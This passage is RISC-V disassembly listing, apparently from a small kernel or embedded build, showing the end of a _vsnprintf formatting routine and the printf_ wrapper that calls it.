    80005a1e:	00178713          	addi	a4,a5,1
    80005a22:	fce43c23          	sd	a4,-40(s0)
    80005a26:	f9843703          	ld	a4,-104(s0)
    80005a2a:	f8843683          	ld	a3,-120(s0)
    80005a2e:	863e                	mv	a2,a5
    80005a30:	f9043583          	ld	a1,-112(s0)
    80005a34:	9702                	jalr	a4
    80005a36:	fec42783          	lw	a5,-20(s0)
    80005a3a:	8b89                	andi	a5,a5,2
    80005a3c:	2781                	sext.w	a5,a5
    80005a3e:	cf8d                	beqz	a5,80005a78 <_vsnprintf+0x9b8>
    80005a40:	a00d                	j	80005a62 <_vsnprintf+0x9a2>
    80005a42:	fd843783          	ld	a5,-40(s0)
    80005a46:	00178713          	addi	a4,a5,1
    80005a4a:	fce43c23          	sd	a4,-40(s0)
    80005a4e:	f9843703          	ld	a4,-104(s0)
    80005a52:	f8843683          	ld	a3,-120(s0)
    80005a56:	863e                	mv	a2,a5
    80005a58:	f9043583          	ld	a1,-112(s0)
    80005a5c:	02000513          	li	a0,32
    80005a60:	9702                	jalr	a4
    80005a62:	fd042783          	lw	a5,-48(s0)
    80005a66:	0017871b          	addiw	a4,a5,1
    80005a6a:	fce42823          	sw	a4,-48(s0)
    80005a6e:	fe842703          	lw	a4,-24(s0)
    80005a72:	2701                	sext.w	a4,a4
    80005a74:	fce7e7e3          	bltu	a5,a4,80005a42 <_vsnprintf+0x982>
    80005a78:	f8043783          	ld	a5,-128(s0)
    80005a7c:	0785                	addi	a5,a5,1
    80005a7e:	f8f43023          	sd	a5,-128(s0)
    80005a82:	ac3d                	j	80005cc0 <_vsnprintf+0xc00>
    80005a84:	f7843783          	ld	a5,-136(s0)
    80005a88:	00878713          	addi	a4,a5,8
    80005a8c:	f6e43c23          	sd	a4,-136(s0)
    80005a90:	639c                	ld	a5,0(a5)
    80005a92:	fcf43423          	sd	a5,-56(s0)
    80005a96:	fe442783          	lw	a5,-28(s0)
    80005a9a:	2781                	sext.w	a5,a5
    80005a9c:	c781                	beqz	a5,80005aa4 <_vsnprintf+0x9e4>
    80005a9e:	fe446783          	lwu	a5,-28(s0)
    80005aa2:	a011                	j	80005aa6 <_vsnprintf+0x9e6>
    80005aa4:	57fd                	li	a5,-1
    80005aa6:	85be                	mv	a1,a5
    80005aa8:	fc843503          	ld	a0,-56(s0)
    80005aac:	d36fe0ef          	jal	80003fe2 <_strnlen_s>
    80005ab0:	87aa                	mv	a5,a0
    80005ab2:	fcf42223          	sw	a5,-60(s0)
    80005ab6:	fec42783          	lw	a5,-20(s0)
    80005aba:	4007f793          	andi	a5,a5,1024
    80005abe:	2781                	sext.w	a5,a5
    80005ac0:	cb89                	beqz	a5,80005ad2 <_vsnprintf+0xa12>
    80005ac2:	fe446703          	lwu	a4,-28(s0)
    80005ac6:	fc446783          	lwu	a5,-60(s0)
    80005aca:	0af757b3          	minu	a5,a4,a5
    80005ace:	fcf42223          	sw	a5,-60(s0)
    80005ad2:	fec42783          	lw	a5,-20(s0)
    80005ad6:	8b89                	andi	a5,a5,2
    80005ad8:	2781                	sext.w	a5,a5
    80005ada:	e7a5                	bnez	a5,80005b42 <_vsnprintf+0xa82>
    80005adc:	a00d                	j	80005afe <_vsnprintf+0xa3e>
    80005ade:	fd843783          	ld	a5,-40(s0)
    80005ae2:	00178713          	addi	a4,a5,1
    80005ae6:	fce43c23          	sd	a4,-40(s0)
    80005aea:	f9843703          	ld	a4,-104(s0)
    80005aee:	f8843683          	ld	a3,-120(s0)
    80005af2:	863e                	mv	a2,a5
    80005af4:	f9043583          	ld	a1,-112(s0)
    80005af8:	02000513          	li	a0,32
    80005afc:	9702                	jalr	a4
    80005afe:	fc442783          	lw	a5,-60(s0)
    80005b02:	0017871b          	addiw	a4,a5,1
    80005b06:	fce42223          	sw	a4,-60(s0)
    80005b0a:	fe842703          	lw	a4,-24(s0)
    80005b0e:	2701                	sext.w	a4,a4
    80005b10:	fce7e7e3          	bltu	a5,a4,80005ade <_vsnprintf+0xa1e>
    80005b14:	a03d                	j	80005b42 <_vsnprintf+0xa82>
    80005b16:	fc843783          	ld	a5,-56(s0)
    80005b1a:	00178713          	addi	a4,a5,1
    80005b1e:	fce43423          	sd	a4,-56(s0)
    80005b22:	0007c503          	lbu	a0,0(a5)
    80005b26:	fd843783          	ld	a5,-40(s0)
    80005b2a:	00178713          	addi	a4,a5,1
    80005b2e:	fce43c23          	sd	a4,-40(s0)
    80005b32:	f9843703          	ld	a4,-104(s0)
    80005b36:	f8843683          	ld	a3,-120(s0)
    80005b3a:	863e                	mv	a2,a5
    80005b3c:	f9043583          	ld	a1,-112(s0)
    80005b40:	9702                	jalr	a4
    80005b42:	fc843783          	ld	a5,-56(s0)
    80005b46:	0007c783          	lbu	a5,0(a5)
    80005b4a:	cf91                	beqz	a5,80005b66 <_vsnprintf+0xaa6>
    80005b4c:	fec42783          	lw	a5,-20(s0)
    80005b50:	4007f793          	andi	a5,a5,1024
    80005b54:	2781                	sext.w	a5,a5
    80005b56:	d3e1                	beqz	a5,80005b16 <_vsnprintf+0xa56>
    80005b58:	fe442783          	lw	a5,-28(s0)
    80005b5c:	fff7871b          	addiw	a4,a5,-1
    80005b60:	fee42223          	sw	a4,-28(s0)
    80005b64:	fbcd                	bnez	a5,80005b16 <_vsnprintf+0xa56>
    80005b66:	fec42783          	lw	a5,-20(s0)
    80005b6a:	8b89                	andi	a5,a5,2
    80005b6c:	2781                	sext.w	a5,a5
    80005b6e:	cf8d                	beqz	a5,80005ba8 <_vsnprintf+0xae8>
    80005b70:	a00d                	j	80005b92 <_vsnprintf+0xad2>
    80005b72:	fd843783          	ld	a5,-40(s0)
    80005b76:	00178713          	addi	a4,a5,1
    80005b7a:	fce43c23          	sd	a4,-40(s0)
    80005b7e:	f9843703          	ld	a4,-104(s0)
    80005b82:	f8843683          	ld	a3,-120(s0)
    80005b86:	863e                	mv	a2,a5
    80005b88:	f9043583          	ld	a1,-112(s0)
    80005b8c:	02000513          	li	a0,32
    80005b90:	9702                	jalr	a4
    80005b92:	fc442783          	lw	a5,-60(s0)
    80005b96:	0017871b          	addiw	a4,a5,1
    80005b9a:	fce42223          	sw	a4,-60(s0)
    80005b9e:	fe842703          	lw	a4,-24(s0)
    80005ba2:	2701                	sext.w	a4,a4
    80005ba4:	fce7e7e3          	bltu	a5,a4,80005b72 <_vsnprintf+0xab2>
    80005ba8:	f8043783          	ld	a5,-128(s0)
    80005bac:	0785                	addi	a5,a5,1
    80005bae:	f8f43023          	sd	a5,-128(s0)
    80005bb2:	a239                	j	80005cc0 <_vsnprintf+0xc00>
    80005bb4:	47c1                	li	a5,16
    80005bb6:	fef42423          	sw	a5,-24(s0)
    80005bba:	fec42783          	lw	a5,-20(s0)
    80005bbe:	0217e793          	ori	a5,a5,33
    80005bc2:	fef42623          	sw	a5,-20(s0)
    80005bc6:	4785                	li	a5,1
    80005bc8:	faf40da3          	sb	a5,-69(s0)
    80005bcc:	fbb44783          	lbu	a5,-69(s0)
    80005bd0:	0ff7f793          	zext.b	a5,a5
    80005bd4:	c3b1                	beqz	a5,80005c18 <_vsnprintf+0xb58>
    80005bd6:	f7843783          	ld	a5,-136(s0)
    80005bda:	00878713          	addi	a4,a5,8
    80005bde:	f6e43c23          	sd	a4,-136(s0)
    80005be2:	639c                	ld	a5,0(a5)
    80005be4:	86be                	mv	a3,a5
    80005be6:	fe442703          	lw	a4,-28(s0)
    80005bea:	fec42783          	lw	a5,-20(s0)
    80005bee:	e43e                	sd	a5,8(sp)
    80005bf0:	fe842783          	lw	a5,-24(s0)
    80005bf4:	e03e                	sd	a5,0(sp)
    80005bf6:	88ba                	mv	a7,a4
    80005bf8:	4841                	li	a6,16
    80005bfa:	4781                	li	a5,0
    80005bfc:	8736                	mv	a4,a3
    80005bfe:	f8843683          	ld	a3,-120(s0)
    80005c02:	fd843603          	ld	a2,-40(s0)
    80005c06:	f9043583          	ld	a1,-112(s0)
    80005c0a:	f9843503          	ld	a0,-104(s0)
    80005c0e:	993fe0ef          	jal	800045a0 <_ntoa_long_long>
    80005c12:	fca43c23          	sd	a0,-40(s0)
    80005c16:	a089                	j	80005c58 <_vsnprintf+0xb98>
    80005c18:	f7843783          	ld	a5,-136(s0)
    80005c1c:	00878713          	addi	a4,a5,8
    80005c20:	f6e43c23          	sd	a4,-136(s0)
    80005c24:	639c                	ld	a5,0(a5)
    80005c26:	86be                	mv	a3,a5
    80005c28:	fe442703          	lw	a4,-28(s0)
    80005c2c:	fec42783          	lw	a5,-20(s0)
    80005c30:	e43e                	sd	a5,8(sp)
    80005c32:	fe842783          	lw	a5,-24(s0)
    80005c36:	e03e                	sd	a5,0(sp)
    80005c38:	88ba                	mv	a7,a4
    80005c3a:	4841                	li	a6,16
    80005c3c:	4781                	li	a5,0
    80005c3e:	8736                	mv	a4,a3
    80005c40:	f8843683          	ld	a3,-120(s0)
    80005c44:	fd843603          	ld	a2,-40(s0)
    80005c48:	f9043583          	ld	a1,-112(s0)
    80005c4c:	f9843503          	ld	a0,-104(s0)
    80005c50:	83bfe0ef          	jal	8000448a <_ntoa_long>
    80005c54:	fca43c23          	sd	a0,-40(s0)
    80005c58:	f8043783          	ld	a5,-128(s0)
    80005c5c:	0785                	addi	a5,a5,1
    80005c5e:	f8f43023          	sd	a5,-128(s0)
    80005c62:	a8b9                	j	80005cc0 <_vsnprintf+0xc00>
    80005c64:	fd843783          	ld	a5,-40(s0)
    80005c68:	00178713          	addi	a4,a5,1
    80005c6c:	fce43c23          	sd	a4,-40(s0)
    80005c70:	f9843703          	ld	a4,-104(s0)
    80005c74:	f8843683          	ld	a3,-120(s0)
    80005c78:	863e                	mv	a2,a5
    80005c7a:	f9043583          	ld	a1,-112(s0)
    80005c7e:	02500513          	li	a0,37
    80005c82:	9702                	jalr	a4
    80005c84:	f8043783          	ld	a5,-128(s0)
    80005c88:	0785                	addi	a5,a5,1
    80005c8a:	f8f43023          	sd	a5,-128(s0)
    80005c8e:	a80d                	j	80005cc0 <_vsnprintf+0xc00>
    80005c90:	f8043783          	ld	a5,-128(s0)
    80005c94:	0007c503          	lbu	a0,0(a5)
    80005c98:	fd843783          	ld	a5,-40(s0)
    80005c9c:	00178713          	addi	a4,a5,1
    80005ca0:	fce43c23          	sd	a4,-40(s0)
    80005ca4:	f9843703          	ld	a4,-104(s0)
    80005ca8:	f8843683          	ld	a3,-120(s0)
    80005cac:	863e                	mv	a2,a5
    80005cae:	f9043583          	ld	a1,-112(s0)
    80005cb2:	9702                	jalr	a4
    80005cb4:	f8043783          	ld	a5,-128(s0)
    80005cb8:	0785                	addi	a5,a5,1
    80005cba:	f8f43023          	sd	a5,-128(s0)
    80005cbe:	0001                	nop
    80005cc0:	f8043783          	ld	a5,-128(s0)
    80005cc4:	0007c783          	lbu	a5,0(a5)
    80005cc8:	c2079863          	bnez	a5,800050f8 <_vsnprintf+0x38>
    80005ccc:	fd843703          	ld	a4,-40(s0)
    80005cd0:	f8843783          	ld	a5,-120(s0)
    80005cd4:	00f76663          	bltu	a4,a5,80005ce0 <_vsnprintf+0xc20>
    80005cd8:	f8843783          	ld	a5,-120(s0)
    80005cdc:	17fd                	addi	a5,a5,-1
    80005cde:	a019                	j	80005ce4 <_vsnprintf+0xc24>
    80005ce0:	fd843783          	ld	a5,-40(s0)
    80005ce4:	f9843703          	ld	a4,-104(s0)
    80005ce8:	f8843683          	ld	a3,-120(s0)
    80005cec:	863e                	mv	a2,a5
    80005cee:	f9043583          	ld	a1,-112(s0)
    80005cf2:	4501                	li	a0,0
    80005cf4:	9702                	jalr	a4
    80005cf6:	fd843783          	ld	a5,-40(s0)
    80005cfa:	2781                	sext.w	a5,a5
    80005cfc:	853e                	mv	a0,a5
    80005cfe:	60ea                	ld	ra,152(sp)
    80005d00:	644a                	ld	s0,144(sp)
    80005d02:	610d                	addi	sp,sp,160
    80005d04:	8082                	ret

Disassembly of section .text.printf_:

0000000080005d06 <printf_>:
    80005d06:	7119                	addi	sp,sp,-128
    80005d08:	fc06                	sd	ra,56(sp)
    80005d0a:	f822                	sd	s0,48(sp)
    80005d0c:	0080                	addi	s0,sp,64
    80005d0e:	fca43423          	sd	a0,-56(s0)
    80005d12:	e40c                	sd	a1,8(s0)
    80005d14:	e810                	sd	a2,16(s0)
    80005d16:	ec14                	sd	a3,24(s0)
    80005d18:	f018                	sd	a4,32(s0)
    80005d1a:	f41c                	sd	a5,40(s0)
    80005d1c:	03043823          	sd	a6,48(s0)
    80005d20:	03143c23          	sd	a7,56(s0)
    80005d24:	04040793          	addi	a5,s0,64
    80005d28:	fcf43023          	sd	a5,-64(s0)
    80005d2c:	fc043783          	ld	a5,-64(s0)
    80005d30:	fc878793          	addi	a5,a5,-56
    80005d34:	fef43023          	sd	a5,-32(s0)
    80005d38:	fe043703          	ld	a4,-32(s0)
    80005d3c:	fd840793          	addi	a5,s0,-40
    80005d40:	fc843683          	ld	a3,-56(s0)
    80005d44:	567d                	li	a2,-1
    80005d46:	85be                	mv	a1,a5
    80005d48:	ffffe517          	auipc	a0,0xffffe
    80005d4c:	26250513          	addi	a0,a0,610 # 80003faa <_out_char>
    80005d50:	b70ff0ef          	jal	800050c0 <_vsnprintf>
    80005d54:	87aa                	mv	a5,a0
    80005d56:	fef42623          	sw	a5,-20(s0)
    80005d5a:	fec42783          	lw	a5,-20(s0)
    80005d5e:	853e                	mv	a0,a5
    80005d60:	70e2                	ld	ra,56(sp)
    80005d62:	7442                	ld	s0,48(sp)
    80005d64:	6109                	addi	sp,sp,128
    80005d66:	8082                	ret
